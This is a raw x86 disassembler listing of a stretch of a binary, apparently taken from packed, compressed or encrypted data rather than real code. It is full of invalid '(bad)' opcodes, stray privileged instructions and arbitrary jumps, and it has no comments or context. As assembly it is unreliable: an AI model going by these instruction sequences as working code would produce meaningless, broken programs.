  423e33:	adc    DWORD PTR [esi+0xa],edi
  423e36:	jmp    0xe3a7e3cf
  423e3b:	add    al,BYTE PTR [eax]
  423e3d:	popa   
  423e3e:	idiv   BYTE PTR [eax+0x43]
  423e41:	lock popa 
  423e43:	inc    edx
  423e44:	das    
  423e45:	or     edx,DWORD PTR [esi]
  423e47:	sar    bl,cl
  423e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e4a:	bswap  esi
  423e4c:	mov    cl,BYTE PTR [ebp+0x3a]
  423e4f:	xchg   esp,eax
  423e50:	stc    
  423e51:	dec    ecx
  423e52:	cwde   
  423e53:	mov    dl,BYTE PTR [ebx+ebx*4+0xfe72ee0]
  423e5a:	leave  
  423e5b:	scas   eax,DWORD PTR es:[edi]
  423e5c:	jbe    0x423e19
  423e5e:	xor    DWORD PTR [edi+0x15162a40],ebx
  423e64:	push   edx
  423e65:	cmp    ah,BYTE PTR [edi]
  423e67:	or     DWORD PTR [ebx-0x7a],ecx
  423e6a:	pop    esp
  423e6b:	add    ebp,ebp
  423e6d:	sti    
  423e6e:	or     BYTE PTR [ebx-0x5652d771],al
  423e74:	fwait
  423e75:	xor    DWORD PTR [ebp+0x52],esp
  423e78:	xor    al,0xa5
  423e7a:	dec    eax
  423e7b:	arpl   cx,sp
  423e7d:	sub    BYTE PTR [esp+eax*4+0x1b5c1922],0xd1
  423e85:	sbb    DWORD PTR ds:0xdd234fb1,edx
  423e8b:	jle    0x423e77
  423e8d:	add    ch,BYTE PTR [edx+0x4fda5395]
  423e93:	add    DWORD PTR [edi],eax
  423e95:	sub    eax,0xfcb45638
  423e9a:	dec    esp
  423e9b:	cwde   
  423e9c:	mov    ds:0xa1de2f7f,eax
  423ea1:	xor    ebp,DWORD PTR [ebx-0x2ea3166f]
  423ea7:	(bad)  
  423ea8:	bound  esi,QWORD PTR [ebp+0x62]
  423eab:	jae    0x423e8a
  423ead:	into   
  423eae:	pushf  
  423eaf:	shl    BYTE PTR ss:[edi+0x62e2a11c],0xaf
  423eb7:	sbb    al,0xd3
  423eb9:	jmp    0xde685924
  423ebe:	and    al,0x85
  423ec0:	sbb    eax,0x40ec1e99
  423ec5:	jmp    0x423f30
  423ec7:	pop    ss
  423ec8:	in     eax,0xf9
  423eca:	adc    edi,DWORD PTR [esi+0x58]
  423ecd:	xchg   ebp,eax
  423ece:	repz in eax,0x9c
  423ed1:	out    dx,eax
  423ed2:	jp     0x423ea8
  423ed4:	cmp    eax,0x662d3ba7
  423ed9:	jnp    0x423ef0
  423edb:	cmp    al,0xbb
  423edd:	js     0x423eb1
  423edf:	xor    eax,0x1f8b7102
  423ee4:	outs   dx,DWORD PTR ds:[esi]
  423ee5:	cmp    dh,al
  423ee7:	out    dx,eax
  423ee8:	sub    BYTE PTR [edx+0x3d73853e],0x4c
  423eef:	or     ebp,ecx
  423ef1:	push   ebx
  423ef2:	mov    eax,ds:0x98895fe7
  423ef7:	jnp    0x423ef9
  423ef9:	jge    0x423e86
  423efb:	jmp    0x4a1e:0x6ddbca94
  423f02:	mov    dl,0x9
  423f04:	pop    eax
  423f05:	push   ecx
  423f06:	sub    al,0xf1
  423f08:	mov    edi,0x48cc4c0c
  423f0d:	lahf   
  423f0e:	lock mov BYTE PTR [ebx-0x13],dl
  423f12:	ss xor al,0xc8
  423f15:	mov    ebp,0x2c426579
  423f1a:	or     eax,0x8ffb4c0
  423f1f:	jl     0x423f34
  423f21:	adc    esp,DWORD PTR [edx-0x1b]
  423f24:	dec    BYTE PTR [eax]
  423f26:	adc    al,BYTE PTR [ebx-0x4b456607]
  423f2c:	imul   esi,edx,0xffffff8d
  423f2f:	or     DWORD PTR [edx+0x55],ebp
  423f32:	test   DWORD PTR [edi-0x22],ebx
  423f35:	xchg   edx,eax
  423f36:	arpl   bp,bp
  423f38:	(bad)  
  423f39:	es jne 0x423f8a
  423f3c:	xchg   ecx,eax
  423f3d:	xor    BYTE PTR [ebx],cl
  423f3f:	push   edi
  423f40:	cwde   
  423f41:	mov    esi,0xebdf41da
  423f46:	dec    ebp
  423f47:	xchg   esp,eax
  423f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f49:	rcr    BYTE PTR [eax+edi*4-0x58],0xf0
  423f4e:	mul    BYTE PTR [ecx-0xaa9c479]
  423f54:	int3   
  423f55:	popa   
  423f56:	sar    BYTE PTR [edx-0x47],0xab
  423f5a:	(bad)  
  423f5b:	iret   
  423f5c:	push   edi
  423f5d:	cdq    
  423f5e:	xchg   ecx,eax
  423f5f:	push   0x8be8ec1c
  423f64:	xchg   ebx,eax
  423f65:	adc    al,0x7e
  423f67:	out    0xab,eax
  423f69:	iret   
  423f6a:	bswap  eax
  423f6c:	(bad)  
  423f6d:	cmp    al,0xe9
  423f6f:	fstp   QWORD PTR [ebp+0x4c95d962]
  423f75:	js     0x423f28
  423f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f78:	add    al,0x50
  423f7a:	xor    eax,0x1046919
  423f7f:	test   eax,0xb592b0da
  423f84:	xor    DWORD PTR [ecx-0x34],esi
  423f87:	cmp    eax,0x887a3f75
  423f8c:	fisubr WORD PTR [eax+eiz*4-0x4f]
  423f90:	imul   ecx,DWORD PTR [ebx],0xffffffcd
  423f93:	sbb    cl,BYTE PTR [eax-0x1a]
  423f96:	mov    ah,0x31
  423f98:	out    0xe9,al
  423f9a:	jnp    0x423ff6
  423f9c:	outs   dx,BYTE PTR ds:[esi]
  423f9d:	push   ss
  423f9e:	xlat   BYTE PTR ds:[ebx]
  423f9f:	adc    al,BYTE PTR [edi]
  423fa1:	add    BYTE PTR [ebp+edi*2-0x5f4d4ea7],ah
  423fa8:	cli    
  423fa9:	gs aas 
  423fab:	int    0xd2
  423fad:	xor    ch,BYTE PTR [edx-0x6bad7d05]
  423fb3:	cmp    ch,BYTE PTR [edi-0x66]
  423fb6:	or     dh,bh
  423fb8:	cli    
  423fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fba:	out    0xe1,eax
  423fbc:	out    0x6e,eax
  423fbe:	js     0x423ff5
  423fc0:	aas    
  423fc1:	pop    esi
  423fc2:	fadd   st,st(5)
  423fc4:	js     0x423ff3
  423fc6:	sbb    al,0x66
  423fc8:	ror    eax,cl
  423fca:	pop    ds
  423fcb:	inc    eax
  423fcc:	lds    eax,FWORD PTR [esp+edi*1-0x7b]
  423fd0:	mov    ebp,0x8ca9babc
  423fd5:	imul   ebp
  423fd7:	popf   
  423fd8:	push   esi
  423fd9:	outs   dx,DWORD PTR ds:[esi]
  423fda:	ss mov esp,0xc3a65551
  423fe0:	xor    bl,ch
  423fe2:	fs das 
  423fe4:	fwait
  423fe5:	xchg   edx,eax
  423fe6:	out    0x92,eax
  423fe8:	leave  
  423fe9:	clc    
  423fea:	sub    dh,BYTE PTR [ebx+0x38]
  423fed:	push   ecx
  423fee:	pop    ds
  423fef:	mov    al,ds:0x2539ca14
  423ff4:	mul    DWORD PTR [eax+0x1c9a8790]
  423ffa:	pop    eax
  423ffb:	imul   ecx,DWORD PTR [ebx],0x7a6f9777
  424001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424002:	fidiv  DWORD PTR [esi]
  424004:	pop    edi
  424005:	mov    ch,0xe0
  424007:	adc    esi,edx
  424009:	aaa    
  42400a:	sbb    eax,0x5987d5a7
  42400f:	outs   dx,DWORD PTR ds:[esi]
  424010:	sub    eax,0x9ab70813
  424015:	jl     0x42403a
  424017:	xchg   esp,eax
  424018:	mov    al,ds:0x57a0eb5d
  42401d:	adc    BYTE PTR [edx],ah
  42401f:	cmp    DWORD PTR [edx],eax
  424021:	xchg   esp,eax
  424022:	mov    WORD PTR [edx-0x375b3c0a],?
  424028:	cli    
  424029:	mov    dl,0xcc
  42402b:	jnp    0x42407b
  42402d:	jl     0x424095
  42402f:	mov    ds:0x2af19254,al
  424034:	add    ah,bh
  424036:	pop    es
  424037:	fs sbb eax,0xaecbd8bb
  42403d:	rcl    DWORD PTR [ecx+0x361dc1aa],1
  424043:	xlat   BYTE PTR ds:[ebx]
  424044:	out    dx,eax
  424045:	loope  0x424035
  424047:	aas    
  424048:	sar    BYTE PTR [edi],cl
  42404a:	clc    
  42404b:	cli    
  42404c:	dec    ecx
  42404d:	scas   al,BYTE PTR es:[edi]
  42404e:	(bad)  
  42404f:	mov    ch,0x85
  424051:	popa   
  424052:	mov    ecx,0xbf419f0b
  424057:	xlat   BYTE PTR ds:[ebx]
  424058:	mov    ds:0x95da9d6d,al
  42405d:	inc    edx
  42405e:	loop   0x42400c
  424060:	ins    DWORD PTR es:[edi],dx
  424061:	aas    
  424062:	out    0xc8,al
  424064:	ret    0x2fdc
  424067:	outs   dx,BYTE PTR ds:[esi]
  424068:	popf   
  424069:	cmp    DWORD PTR [eax-0x49],ebp
  42406c:	mov    ah,bl
  42406e:	jo     0x424047
  424070:	test   DWORD PTR ds:0x52e654c4,ebp
  424076:	sub    eax,0xf1cc2470
  42407b:	xchg   esi,eax
  42407c:	test   DWORD PTR [esi],eax
  42407e:	xor    al,0xe7
  424080:	bound  ecx,QWORD PTR [edi+0x78]
  424083:	das    
  424084:	pop    es
  424085:	fdivrp st(1),st
  424087:	(bad)  
  424088:	out    0xab,eax
  42408a:	ror    BYTE PTR [ebp+edi*2+0x2fbea339],1
  424091:	mov    edx,DWORD PTR [ebp+0x2c86d4d4]
  424097:	inc    esi
  424098:	mov    bl,0xc0
  42409a:	add    esi,ebx
  42409c:	ror    DWORD PTR [eax+0x38d05d5],0x7a
  4240a3:	sti    
  4240a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240a5:	mov    dl,0xc7
  4240a7:	ret    0xd2e1
  4240aa:	mov    esi,0x635bfe2f
  4240af:	xchg   esi,eax
  4240b0:	ret    
  4240b1:	xor    eax,DWORD PTR [esi+ebx*1+0x18]
  4240b5:	div    dl
  4240b7:	inc    esi
  4240b8:	inc    esp
  4240b9:	fimul  DWORD PTR [ebp+0x1b]
  4240bc:	cmp    dh,bh
  4240be:	dec    esp
  4240bf:	or     eax,0x5e
  4240c2:	rol    BYTE PTR [esi+0x1c],1
  4240c5:	and    eax,0x7435cb0b
  4240ca:	adc    dh,BYTE PTR [bx+di+0x49]
  4240ce:	addr16 (bad) 
  4240d0:	ja     0x42413f
  4240d2:	in     eax,dx
  4240d3:	dec    ebp
  4240d4:	outs   dx,DWORD PTR ds:[esi]
  4240d5:	nop
  4240d6:	in     eax,dx
  4240d7:	pop    edi
  4240d8:	popf   
  4240d9:	(bad)  
  4240da:	mov    ds:0x1b5cca9c,al
  4240df:	xchg   esi,eax
  4240e0:	mov    edx,0x8bbbc803
  4240e5:	in     al,0xf9
  4240e7:	xchg   ebx,eax
  4240e8:	aaa    
  4240e9:	inc    esp
  4240ea:	jns    0x42416b
  4240ec:	mov    esp,0x2f7d832b
  4240f1:	ins    BYTE PTR es:[edi],dx
  4240f2:	adc    ebx,DWORD PTR [ecx-0x76018e36]
  4240f8:	xor    al,0x16
  4240fa:	push   edi
  4240fb:	xchg   edx,eax
  4240fc:	addr16 mov bh,0xae
  4240ff:	mov    ds:0x6052fb0e,eax
  424104:	cmc    
  424105:	test   BYTE PTR [ebx-0x118ff1ed],0xe8
  42410c:	and    esp,esi
  42410e:	mov    ch,0x19
  424110:	fwait
  424111:	mov    ebx,0xaa3d1818
  424116:	cli    
  424117:	das    
  424118:	mov    bl,0x2f
  42411a:	iret   
  42411b:	(bad)  
  42411c:	fs jmp 0x42418e
  42411f:	retf   0x822
  424122:	push   esi
  424123:	lock stos DWORD PTR es:[edi],eax
  424125:	push   ds
  424126:	iret   
  424127:	aaa    
  424128:	bound  edx,QWORD PTR [ebp+0x22]
  42412b:	mov    al,ds:0x9d522f27
  424130:	or     dl,BYTE PTR [esi]
  424132:	mov    BYTE PTR [ebx+0x2e0369d],bl
  424138:	mov    ebx,DWORD PTR fs:[ebx-0x39]
  42413c:	cmp    edx,DWORD PTR [edi+eax*2+0x427a82b]
  424143:	jae    0x42415d
  424145:	leave  
  424146:	dec    esp
  424147:	std    
  424148:	dec    ebx
  424149:	mov    esi,DWORD PTR [ecx-0x71176f24]
  42414f:	scas   al,BYTE PTR es:[edi]
  424150:	jmp    0x4240f1
  424152:	sar    DWORD PTR [eax+esi*1+0x45bf5b85],0x1b
  42415a:	xchg   DWORD PTR [edi],ecx
  42415c:	adc    BYTE PTR [ebp+0x7c],0x2
  424160:	jp     0x424197
  424162:	inc    edi
  424163:	mov    WORD PTR [esi+0x31],ss
  424166:	jne    0x424102
  424168:	aam    0x47
  42416a:	out    0xc9,eax
  42416c:	xchg   ebp,eax
  42416d:	add    al,0x62
  42416f:	sbb    ebx,DWORD PTR [esi]
  424171:	xchg   ebp,eax
  424172:	or     al,0xe4
  424174:	jmp    0x631c6425
  424179:	(bad)  
  42417a:	cli    
  42417b:	mov    bh,0xc4
  42417d:	pop    es
  42417e:	outs   dx,BYTE PTR ds:[esi]
  42417f:	out    0xeb,eax
  424181:	pop    eax
  424182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424183:	xchg   ebp,eax
  424184:	add    DWORD PTR [edx+ecx*2+0x72949540],0xb18bf4a1
  42418f:	inc    esi
  424190:	lods   eax,DWORD PTR ds:[esi]
  424191:	sbb    ecx,DWORD PTR [eax-0x73]
  424194:	into   
  424195:	jge    0x424187
  424197:	and    eax,0x4afec373
  42419c:	push   esp
  42419d:	push   esp
  42419e:	out    0xa5,al
  4241a0:	push   edi
  4241a1:	pop    ds
  4241a2:	sti    
  4241a3:	mov    edx,0x6142fd9
  4241a8:	repz push ebp
  4241aa:	mov    eax,ds:0xf6abdd2d
  4241af:	xor    edi,DWORD PTR [ebx]
  4241b1:	int    0xf5
  4241b3:	jns    0x424145
  4241b5:	xchg   edi,eax
  4241b6:	pop    ebx
  4241b7:	dec    edi
  4241b8:	adc    DWORD PTR [eax],ecx
  4241ba:	pop    ss
  4241bb:	jbe    0x4241e3
  4241bd:	and    DWORD PTR [esi],0x7c8a5bd7
  4241c3:	out    0x11,al
  4241c5:	push   edx
  4241c6:	leave  
  4241c7:	mov    dl,0xdc
  4241c9:	xchg   ecx,eax
  4241ca:	push   esi
  4241cb:	jno    0x424224
  4241cd:	push   edx
  4241ce:	pop    es
  4241cf:	mov    dh,0x14
  4241d1:	sbb    BYTE PTR [ecx+0x5d1ccae],ch
  4241d7:	pop    ds
  4241d8:	jg     0x42422e
  4241da:	jp     0x42415c
  4241dc:	mov    ds:0xa76f76cf,al
  4241e1:	cld    
  4241e2:	std    
  4241e3:	dec    ebx
  4241e4:	sub    esi,DWORD PTR [edi-0x73]
  4241e7:	(bad)  
  4241e9:	test   al,0xc7
  4241eb:	aam    0xa7
  4241ed:	mov    dl,0x6a
  4241ef:	imul   edi,ebp,0xffffff92
  4241f2:	daa    
  4241f3:	inc    edx
  4241f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241f5:	and    esp,DWORD PTR [edi+0x53610735]
  4241fb:	cmc    
  4241fc:	in     eax,dx
  4241fd:	jge    0x42419a
  4241ff:	mov    bl,cl
  424201:	adc    al,0x54
  424203:	cli    
  424204:	add    al,0x35
  424206:	dec    eax
  424207:	mov    dl,0xc1
  424209:	sub    edi,esp
  42420b:	stc    
  42420c:	cmc    
  42420d:	xlat   BYTE PTR ds:[ebx]
  42420e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42420f:	jae    0x4241a0
  424211:	xchg   ebp,eax
  424212:	and    eax,0x116b412e
  424217:	pop    ebp
  424218:	jge    0x42420f
  42421a:	(bad)  [ebp-0x26e0d586]
  424220:	sub    eax,0xb8cddd34
  424225:	inc    eax
  424226:	cdq    
  424227:	aaa    
  424228:	xor    bh,al
  42422a:	and    al,0x62
  42422c:	mov    edi,0x57649065
  424231:	test   edi,ecx
  424233:	data16 xor cl,BYTE PTR [esi+0x11]
  424237:	mov    esp,?
  424239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42423a:	outs   dx,DWORD PTR ds:[esi]
  42423b:	mov    edx,0x67172134
  424240:	sub    edx,DWORD PTR [edx-0x5d4d28b7]
  424246:	loope  0x424215
  424248:	sti    
  424249:	xor    edx,esi
  42424b:	hlt    
  42424c:	fwait
  42424d:	xchg   ebx,eax
  42424e:	aaa    
  42424f:	shl    BYTE PTR [ebp+0x19],cl
  424252:	inc    edx
  424253:	adc    eax,0x91c5a6b8
  424258:	mov    al,ds:0x172db4d3
  42425d:	inc    eax
  42425e:	neg    BYTE PTR [edx+0x3d0c61e6]
  424264:	pop    eax
  424265:	gs scas al,BYTE PTR es:[edi]
  424267:	mov    WORD PTR [eax],fs
  424269:	push   eax
  42426a:	fnsave [edx-0x4cf0c614]
  424270:	jne    0x4242be
  424272:	push   es
  424273:	sbb    al,0xdd
  424275:	mov    esp,0x809842d6
  42427a:	aaa    
  42427b:	and    eax,0xea919e28
  424280:	xor    ah,bh
  424282:	stos   DWORD PTR es:[edi],eax
  424283:	push   cs
  424284:	push   edi
  424285:	fld    QWORD PTR [edx+0x32567891]
  42428b:	xor    BYTE PTR [esi+0x37058c85],0xe9
  424292:	mov    edx,0x8f99b6f9
  424297:	out    dx,al
  424298:	add    DWORD PTR [edi+0x346e67a1],ebp
  42429e:	hlt    
  42429f:	push   edx
  4242a0:	dec    esp
  4242a2:	std    
  4242a3:	out    0x73,al
  4242a5:	es xor eax,0x4c8140be
  4242ab:	pop    esi
  4242ac:	test   DWORD PTR [eax-0x52e0ac57],ebx
  4242b2:	ins    BYTE PTR es:[edi],dx
  4242b3:	or     eax,0x34846052
  4242b8:	jb     0x424315
  4242ba:	jl     0x424298
  4242bc:	bound  esi,QWORD PTR [ebp+0x525eebde]
  4242c2:	or     cl,BYTE PTR [eax]
  4242c4:	neg    eax
  4242c6:	jmp    0xfb7c:0xb969b7f3
  4242cd:	sbb    bh,BYTE PTR [ecx-0x277fce40]
  4242d3:	imul   edi,DWORD PTR [edi],0xffffffca
  4242d6:	jae    0x424312
  4242d8:	jp     0x4242f4
  4242da:	out    dx,al
  4242db:	dec    ebx
  4242dc:	in     eax,0xb2
  4242de:	sub    DWORD PTR [ebp+0x5e],0x981b5d53
  4242e5:	test   BYTE PTR [edx+0x35],al
  4242e8:	inc    esi
  4242e9:	mov    al,0xa4
  4242eb:	into   
  4242ec:	xchg   esi,eax
  4242ed:	gs xor eax,0x9656ccfa
  4242f3:	data16 std 
  4242f5:	scas   al,BYTE PTR es:[edi]
  4242f6:	jmp    0xa6456932
  4242fb:	test   al,0xd
  4242fd:	jp     0x424299
  4242ff:	retf   0xb5df
  424302:	je     0x4242a8
  424304:	or     BYTE PTR [ebx-0x50],bh
  424307:	pusha  
  424308:	fwait
  424309:	sbb    BYTE PTR [ebx+0x48e05c7d],al
  42430f:	pop    edx
  424310:	jmp    0x69b7:0x8bcffe04
  424317:	stc    
  424318:	outs   dx,BYTE PTR cs:[esi]
  42431a:	cmp    ah,dh
  42431c:	sub    DWORD PTR [ecx-0x5882dad2],0x6b
  424323:	(bad)  
  424324:	xor    ebx,DWORD PTR [esi]
  424326:	inc    esp
  424327:	pop    eax
  424328:	cmp    BYTE PTR [edi+0x52],al
  42432b:	test   eax,0x9a014543
  424330:	test   BYTE PTR [esi+0x63],dl
  424333:	sub    eax,0x16b0d4cd
  424338:	mov    ecx,0x31ff7968
  42433d:	pop    ecx
  42433e:	mov    ds:0xf30414c2,al
  424343:	sti    
  424344:	(bad)  
  424345:	hlt    
  424346:	push   es
  424347:	sbb    al,0x14
  424349:	fisub  DWORD PTR [ebp-0x3a]
  42434c:	mov    ch,BYTE PTR [ebx-0x1]
  42434f:	sbb    BYTE PTR [ebx],0x7b
  424352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424353:	loopne 0x424381
  424355:	pop    ecx
  424356:	not    ecx
  424358:	cdq    
  424359:	cmp    al,0xd0
  42435b:	mov    eax,0x1536c505
  424360:	adc    ecx,DWORD PTR [edi+0x3b]
  424363:	or     BYTE PTR [ebx+edi*8],al
  424366:	push   ds
  424367:	in     al,dx
  424368:	mov    ecx,DWORD PTR [ebp-0x6f]
  42436b:	dec    esi
  42436c:	lahf   
  42436d:	jbe    0x4243db
  42436f:	dec    ebp
  424370:	xchg   esp,eax
  424371:	sbb    al,0x55
  424373:	loopne 0x424354
  424375:	outs   dx,BYTE PTR ds:[esi]
  424376:	stos   DWORD PTR es:[edi],eax
  424377:	mov    eax,ds:0x22fc249d
  42437c:	shl    BYTE PTR [ebp-0x5ef0499e],0x1f
  424383:	data16 cmc 
  424385:	out    0xac,eax
  424387:	fcom   DWORD PTR [eax+0x77]
  42438a:	adc    bh,BYTE PTR [ebx+0x4a27c31c]
  424390:	push   edx
  424391:	dec    ecx
  424392:	and    eax,0x2e92ef42
  424397:	iret   
  424398:	call   edx
  42439a:	pushf  
  42439b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42439c:	rol    BYTE PTR [eax-0x53],0xe3
  4243a0:	cmp    DWORD PTR es:[esi],esi
  4243a3:	or     eax,0xbca2b1f3
  4243a8:	into   
  4243a9:	out    dx,eax
  4243aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243ab:	ss xor al,0xf5
  4243ae:	cld    
  4243af:	xor    al,0x45
  4243b1:	sar    BYTE PTR [ebx-0x79],1
  4243b4:	cwde   
  4243b5:	pop    es
  4243b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243b7:	out    0xd,eax
  4243b9:	sub    eax,eax
  4243bb:	jecxz  0x424410
  4243bd:	jnp    0x42441c
  4243bf:	ret    0xed63
  4243c2:	cmp    al,0xb4
  4243c4:	mov    BYTE PTR [eax+0x7145b66],bl
  4243ca:	cmp    DWORD PTR [esi-0x4f],esp
  4243cd:	add    esi,0xffffffd1
  4243d0:	push   ebp
  4243d1:	cmp    eax,0x137ebd2b
  4243d6:	scas   al,BYTE PTR es:[edi]
  4243d7:	inc    eax
  4243d8:	sbb    dl,BYTE PTR [ecx+ebx*8+0x1d5621f2]
  4243df:	in     eax,dx
  4243e0:	push   ebp
  4243e1:	(bad)  
  4243e2:	jnp    0x42440a
  4243e4:	mov    esp,0xc98b4eae
  4243e9:	jne    0x424463
  4243eb:	cli    
  4243ec:	fisttp WORD PTR [eax]
  4243ee:	xchg   BYTE PTR [edi+0x50b747b8],bl
  4243f4:	imul   ecx,DWORD PTR [ecx],0xfffffffa
  4243f7:	ret    0xa093
  4243fa:	cmp    al,bh
  4243fc:	mov    eax,0x357abbfe
  424401:	sahf   
  424402:	cs jne 0x4243b8
  424405:	dec    BYTE PTR [ecx+0x30]
  424408:	adc    al,0x45
  42440a:	ss inc ecx
  42440c:	fldenv [esi+0x4d]
  424410:	call   0xa1b318b3
  424415:	xor    edx,DWORD PTR [edi]
  424417:	(bad)  
  424418:	stc    
  424419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42441a:	add    DWORD PTR [edx-0x73387abd],ecx
  424420:	cmp    ebp,DWORD PTR [eax+0x10]
  424423:	pop    edi
  424424:	leave  
  424425:	lahf   
  424426:	jbe    0x424497
  424428:	repz (bad) 
  42442a:	xor    cl,0x2c
  42442d:	jl     0x42445d
  42442f:	not    BYTE PTR [ecx-0x2597b480]
  424435:	add    eax,0x7fe20b47
  42443a:	mov    cs,WORD PTR [ecx+0x6b55eabb]
  424440:	aas    
  424441:	sub    ah,BYTE PTR [ebx-0x662f33bc]
  424447:	dec    eax
  424448:	clc    
  424449:	and    eax,0x74e60093
  42444e:	jg     0x4244a5
  424450:	inc    esp
  424451:	stc    
  424452:	call   0x231d:0xd14c7043
  424459:	clc    
  42445a:	mov    ebx,0x620a45f8
  42445f:	mov    bh,0xe2
  424461:	lahf   
  424462:	sbb    al,0xec
  424464:	into   
  424465:	cmp    dh,ah
  424467:	jecxz  0x4244e7
  424469:	xchg   ebx,eax
  42446a:	inc    ebx
  42446b:	xrelease xchg DWORD PTR [eax-0x28f6c4fc],edi
  424472:	jge    0x424452
  424474:	mov    edi,0xeb736b9e
  424479:	aam    0xd0
  42447b:	out    0x2,al
  42447d:	sub    eax,0xc88f113f
  424482:	dec    esi
  424483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424484:	jl     0x4244ad
  424486:	mov    cl,0xab
  424488:	int    0xac
  42448a:	shl    BYTE PTR [ebx],0x27
  42448d:	leave  
  42448e:	sub    eax,0xb555b424
  424493:	mov    eax,0xc950399c
	...
  424514:	push   cs
  424515:	pop    esp
  424516:	mov    esp,0xffe7fe47
  42451b:	pop    ebp
  42451c:	es mov eax,0x9c12fe17
  424522:	shr    DWORD PTR [ebx+0x1d945],cl
  424528:	ins    BYTE PTR es:[edi],dx
  424529:	pop    es
  42452a:	add    BYTE PTR [eax],al
  42452c:	sbb    dl,BYTE PTR [esi]
  42452e:	pop    esp
  42452f:	jne    0x4244fa
  424531:	and    al,0xa4
  424533:	test   eax,0xc01a449c
  424538:	pusha  
  424539:	fmul   DWORD PTR ds:[esi+0x4f0bc1e1]
  424540:	add    eax,0xd950664e
  424545:	dec    eax
  424546:	sar    DWORD PTR [esi],0xe1
  424549:	lods   al,BYTE PTR ds:[esi]
  42454a:	(bad)  [ebx+0x7fcb385e]
  424550:	dec    esp
  424551:	sbb    eax,0x54a449bb
  424556:	mov    al,ds:0xa049cc6d
  42455b:	imul   eax,ecx,0xafb7b4a2
  424561:	jo     0x424577
  424563:	test   ch,ah
  424565:	mov    ch,ch
  424567:	cmp    eax,DWORD PTR [ebx+eiz*1-0x13]
  42456b:	add    al,0x78
  42456d:	addr16 jns 0x424586
  424570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424571:	push   esp
  424572:	sbb    ch,BYTE PTR [edx]
  424574:	les    edi,FWORD PTR [eax]
  424576:	and    cl,0xf2
  424579:	cmp    eax,0xcb7e5fa1
  42457e:	mov    eax,0xb560d66c
  424583:	ret    0x9ef3
  424586:	fnstenv [esi+0x7f]
  424589:	mov    eax,0x857506fc
  42458e:	inc    ebp
  42458f:	add    dh,BYTE PTR [edi+0xa]
  424592:	(bad)  [esi+edx*8-0x6c]
  424596:	(bad)  
  424598:	out    dx,al
  424599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42459a:	fmul   QWORD PTR [eax-0x22]
  42459d:	in     eax,dx
  42459e:	adc    DWORD PTR es:[edx],ebp
  4245a1:	mov    esp,0x876d7875
  4245a6:	inc    edi
  4245a7:	int3   
  4245a8:	sub    al,0xef
  4245aa:	test   al,0x9
  4245ac:	inc    edi
  4245ad:	cmp    ebx,DWORD PTR [esi-0x3d]
  4245b0:	jmp    0x80317b7c
  4245b5:	sbb    eax,DWORD PTR [ebx-0x33cd0c9f]
  4245bb:	nop
  4245bc:	mov    esi,0xa2f3612e
  4245c1:	std    
  4245c2:	retf   0x8ec
  4245c5:	scas   eax,DWORD PTR es:[edi]
  4245c6:	mov    DWORD PTR [edx+ecx*2],ecx
  4245c9:	mov    ch,0x1a
  4245cb:	jnp    0x4245a6
  4245cd:	xor    DWORD PTR [edx+0x608aa167],edx
  4245d3:	pop    ecx
  4245d4:	cli    
  4245d5:	jb     0x424655
  4245d7:	dec    esp
  4245d8:	xchg   edx,eax
  4245d9:	fmul   st(7),st
  4245db:	push   ebx
  4245dc:	fisttp DWORD PTR [ebp-0x3a200dfa]
  4245e2:	call   0xed3e:0x23e3a7c
  4245e9:	dec    edx
  4245ea:	sub    eax,0x7c1054a2
  4245ef:	adc    eax,0x155c265c
  4245f4:	and    DWORD PTR [edi],ebp
  4245f6:	test   DWORD PTR [edi-0x44],esp
  4245f9:	pop    ebx
  4245fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245fb:	and    esi,eax
  4245fd:	(bad)
  424600:	mov    dh,0xcc
  424602:	test   BYTE PTR [edi+0x2c945a6],al
  424608:	fnstcw WORD PTR ds:0xe1df3923
  42460e:	dec    edi
  42460f:	mov    ch,0x93
  424611:	hlt    
  424612:	std    
  424613:	shl    BYTE PTR [edx-0x4e68ac72],1
  424619:	mov    cl,0xb
  42461b:	cmp    al,0x3e
  42461d:	scas   al,BYTE PTR es:[edi]
  42461e:	dec    esp
  42461f:	mov    DWORD PTR ds:0xbdcf75aa,eax
  424625:	aaa    
  424626:	fisub  DWORD PTR [esi]
  424628:	inc    edx
  424629:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42462b:	or     ebx,0x4a
  42462e:	sbb    ch,BYTE PTR [eax+0x7a96b1e3]
  424634:	fwait
  424635:	xchg   ebp,eax
  424636:	test   eax,0xb82f97ab
  42463b:	push   ebp
  42463c:	jne    0x424693
  42463e:	mov    BYTE PTR [edi],bl
  424640:	(bad)  
  424641:	fld    QWORD PTR ds:0x868ff0a6
  424647:	mov    es,WORD PTR [eax+ebp*8]
  42464a:	push   ebx
  42464b:	lea    esp,[esi-0x29ccb3fa]
  424651:	out    dx,eax
  424652:	ja     0x4246a7
  424654:	pop    ebx
  424655:	mov    al,0x32
  424657:	dec    ebx
  424658:	iret   
  424659:	aaa    
  42465a:	inc    edi
  42465b:	mov    esp,0x3660540
  424660:	xlat   BYTE PTR ds:[ebx]
  424661:	fs mov ah,0x24
  424664:	retf   
  424665:	outs   dx,DWORD PTR ds:[esi]
  424666:	outs   dx,DWORD PTR ds:[esi]
  424667:	int    0x9a
  424669:	retf   0x5a6a
  42466c:	xchg   ecx,eax
  42466d:	xchg   ebp,eax
  42466e:	mov    ebx,0xfc5cc8e5
  424673:	push   ebx
  424674:	lods   eax,DWORD PTR ds:[esi]
